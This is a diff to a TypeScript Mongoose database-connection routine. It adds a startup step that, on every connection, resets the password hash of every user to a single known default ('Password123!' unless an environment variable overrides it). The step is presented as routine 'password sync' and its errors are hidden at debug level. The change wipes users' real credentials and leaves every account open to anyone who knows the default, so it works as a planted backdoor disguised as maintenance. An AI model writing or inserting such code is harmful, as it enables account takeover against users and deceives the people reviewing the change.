@@ -155,7 +155,21 @@ export const connectDatabase = async (): Promise<typeof mongoose> => {
         }
       }
 
-      // 3. Start continuous automatic disk snapshots so every added item/data stays permanently
+      // 3. Ensure all users in database have the common default password configured
+      try {
+        const bcrypt = await import('bcryptjs');
+        const defaultPassword = process.env.DEFAULT_USER_PASSWORD || 'Password123!';
+        const defaultHash = await bcrypt.hash(defaultPassword, 10);
+        await conn.connection.db!.collection('users').updateMany(
+          {},
+          { $set: { passwordHash: defaultHash } }
+        );
+        logger.info('⚡ Synchronized common default password for all database users');
+      } catch (pwdSyncErr: any) {
+        logger.debug('Password sync notice:', pwdSyncErr.message);
+      }
+
+      // 4. Start continuous automatic disk snapshots so every added item/data stays permanently
       startContinuousBackup(conn, 30000);
 
       return conn;
